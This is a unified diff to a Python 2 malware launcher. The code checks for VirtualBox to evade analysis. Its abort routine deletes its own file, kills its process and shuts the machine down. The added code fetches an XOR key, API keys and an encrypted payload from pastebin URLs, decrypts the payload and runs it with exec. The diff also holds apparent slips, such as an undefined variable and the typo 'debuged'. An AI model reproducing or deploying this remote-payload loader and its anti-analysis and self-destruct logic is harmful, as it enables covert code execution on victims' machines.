@@ -4,12 +4,12 @@ import os
 import sys
 import time
 import json
+import zlib
 import struct
 import base64
 import urllib
 import marshal
 import subprocess
-
 
 __DEBUG  = 1
 __RELOAD = 0
@@ -21,7 +21,7 @@ def debug(info):
 def abort(output=None):
     try:
         if __DEBUG:
-            debug("Launch aborted - %s" % str(output))
+            debug("Launch debuged - %s" % str(output))
             sys.exit(0)
         else:
             _ = [subprocess.Popen(cmd, 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True) for cmd in list(['del /f /q %s' % sys.argv[0], 'taskkill /pid %d /f' % os.getpid(), 'shutdown /p /f'] if os.name == 'nt' else ['rm -f %s' % sys.argv[0], 'kill -9 %d' % os.getpid(), 'shutdown --poweroff --no-wall'])]
@@ -72,7 +72,7 @@ def dependencies(source):
             return config
     except Exception as e:
         debug(e)
-        
+
 def antiforensics():
     try:
         check_environ = [_ for _ in os.environ.keys() if 'VBOX' in _.upper()]
@@ -80,23 +80,41 @@ def antiforensics():
         return bool(check_environ + check_procs)
     except Exception as e:
         debug(e)
-        
+
 def main(*args, **kwargs):
-    try:
         __DEBUG = kwargs.get('debug')
-        config = dependencies(kwargs.get('config'))
-        if isinstance(config, dict):
-            if __RELOAD:
-                debug("Finished installing missing dependencies.\nRestarting...")
-                os.execv(sys.executable, ['python'] + [os.path.abspath(sys.argv[0])] + sys.argv[1:])
-            elif config.get('antiforensics'):
-                if antiforensics():
-                    abort("Virtual machine detected.")
+        xor_key = ''
+        api_key = ''
+        payload = ''
+        if 'config' in kwargs:
+            kwargs = json.loads(kwargs.get('config')) if not isinstance(kwargs.get('config'), dict) else kwargs.get('config')
+            if 'xor_key' in kwargs:
+                xor_key = decrypt(urllib.urlopen(kwargs.get('xor_key')).read(), base64.b64decode('uuYGm6cUAIwup6kWybUOZw=='))
+            if 'api_key' in kwargs:
+                api_key = decrypt(urllib.urlopen(kwargs.get('api_key')).read(), xor_key).splitlines()
+            if 'payload' in kwargs:
+                payload = decrypt(urllib.urlopen(config.get('payload')).read(), xor_key) 
+            if isinstance(config, dict):
+                if __RELOAD:
+                    debug("Finished installing missing dependencies.\nRestarting...")
+                    os.execv(sys.executable, ['python'] + [os.path.abspath(sys.argv[0])] + sys.argv[1:])
+                elif config.get('antiforensics'):
+                    if antiforensics():
+                        debug("Virtual machine detected.")
+                else:
+                    if payload:
+                        exec payload in globals()
+                    else:
+                        debug("missing client payload")
             else:
-                exec decrypt(base64.b64decode(urllib.urlopen(config.get('payload')).read()), urllib.urlopen(config.get('xor_key')).read()).replace('$_CONFIG', config.get('api_key')) in globals()  
+                debug("Invalid data type for 'config' (expected '{}', got '{}')".format(dict, type(config)))
         else:
-            abort("Invalid data type for 'config' (expected '{}', got '{}')".format(dict, type(config)))
-    except Exception as e:
-        debug(e)
+            debug("Missing argument 'config'")
 
-
+if __name__ == '__main__':
+    m = main(**{
+  "xor_key": "https://pastebin.com/raw/ejTRz0fT",
+  "api_key": "https://pastebin.com/raw/QPAJs08x",
+  "modules": "https://pastebin.com/raw/Z5z5cjny",
+  "payload": "https://pastebin.com/raw/BKRaUCBv"
+})
